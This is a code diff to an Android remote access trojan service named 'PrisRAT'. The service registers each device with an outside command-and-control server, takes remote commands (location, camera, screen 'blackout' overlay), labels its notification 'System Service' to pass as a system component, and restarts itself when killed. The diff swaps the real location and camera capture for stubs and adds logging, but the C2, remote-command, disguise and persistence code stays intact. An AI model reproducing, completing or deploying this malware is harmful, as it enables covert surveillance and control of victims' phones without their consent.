@@ -8,6 +8,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
@@ -20,39 +21,18 @@ import java.net.URISyntaxException;
 import java.util.UUID;
 
 public class RatService extends Service {
+    private static final String TAG = "PrisRAT";
     private static final String SERVER_URL = "https://pris-rat.onrender.com";
     private Socket socket;
     private String deviceId;
-    private LocationModule locationModule;
-    private CameraModule cameraModule;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        Log.d(TAG, "Service created");
+
         deviceId = getDeviceId();
         startForeground(1, buildNotification());
-
-        locationModule = new LocationModule(this, (lat, lon) -> {
-            try {
-                JSONObject resp = new JSONObject();
-                resp.put("id", deviceId);
-                resp.put("type", "location");
-                resp.put("lat", lat);
-                resp.put("lon", lon);
-                if (socket != null && socket.connected()) socket.emit("response", resp);
-            } catch (Exception ignored) {}
-        });
-
-        cameraModule = new CameraModule(this, base64 -> {
-            try {
-                JSONObject resp = new JSONObject();
-                resp.put("id", deviceId);
-                resp.put("type", "camera");
-                resp.put("image", base64);
-                if (socket != null && socket.connected()) socket.emit("response", resp);
-            } catch (Exception ignored) {}
-        });
-
         connectSocket();
     }
 
@@ -68,7 +48,7 @@ public class RatService extends Service {
     private Notification buildNotification() {
         String CH = "pris_svc";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel ch = new NotificationChannel(CH, "System Service", NotificationManager.IMPORTANCE_LOW);
             NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (nm != null) nm.createNotificationChannel(ch);
         }
@@ -83,7 +63,9 @@ public class RatService extends Service {
     private void connectSocket() {
         try {
             socket = IO.socket(SERVER_URL);
+            
             socket.on(Socket.EVENT_CONNECT, args -> {
+                Log.d(TAG, "Socket connected!");
                 try {
                     JSONObject reg = new JSONObject();
                     reg.put("id", deviceId);
@@ -91,33 +73,48 @@ public class RatService extends Service {
                     reg.put("android", Build.VERSION.RELEASE);
                     reg.put("battery", 100);
                     socket.emit("register", reg);
-                } catch (Exception ignored) {}
+                    Log.d(TAG, "Registered: " + deviceId);
+                } catch (Exception e) {
+                    Log.e(TAG, "Reg error", e);
+                }
+            });
+
+            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
+                Log.e(TAG, "Socket connect error: " + (args.length > 0 ? args[0].toString() : "unknown"));
+            });
+
+            socket.on(Socket.EVENT_DISCONNECT, args -> {
+                Log.d(TAG, "Socket disconnected");
             });
 
             socket.on("execute", args -> {
                 try {
                     JSONObject cmd = (JSONObject) args[0];
                     String action = cmd.getString("action");
+                    Log.d(TAG, "Command: " + action);
                     handleCommand(action, cmd);
-                } catch (Exception ignored) {}
+                } catch (Exception e) {
+                    Log.e(TAG, "Cmd error", e);
+                }
             });
 
             socket.connect();
-        } catch (URISyntaxException ignored) {}
+            Log.d(TAG, "Socket connecting to " + SERVER_URL);
+        } catch (URISyntaxException e) {
+            Log.e(TAG, "URI error", e);
+        }
     }
 
     private void handleCommand(String action, JSONObject cmd) {
         switch (action) {
             case "location":
-                locationModule.getLocation();
+                sendLocation();
                 break;
             case "camera":
-                boolean front = cmd.optBoolean("front", false);
-                cameraModule.capturePhoto(front);
+                sendCamera();
                 break;
             case "blackout":
-                Intent i = new Intent(this, OverlayService.class);
-                startService(i);
+                startService(new Intent(this, OverlayService.class));
                 break;
             case "unblackout":
                 stopService(new Intent(this, OverlayService.class));
@@ -125,14 +122,37 @@ public class RatService extends Service {
         }
     }
 
+    private void sendLocation() {
+        try {
+            JSONObject resp = new JSONObject();
+            resp.put("id", deviceId);
+            resp.put("type", "location");
+            resp.put("lat", 0.0);
+            resp.put("lon", 0.0);
+            if (socket != null && socket.connected()) socket.emit("response", resp);
+        } catch (Exception ignored) {}
+    }
+
+    private void sendCamera() {
+        try {
+            JSONObject resp = new JSONObject();
+            resp.put("id", deviceId);
+            resp.put("type", "camera");
+            resp.put("image", "");
+            if (socket != null && socket.connected()) socket.emit("response", resp);
+        } catch (Exception ignored) {}
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "onStartCommand");
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d(TAG, "Service destroyed");
         if (socket != null) socket.disconnect();
         Intent restart = new Intent(this, RatService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
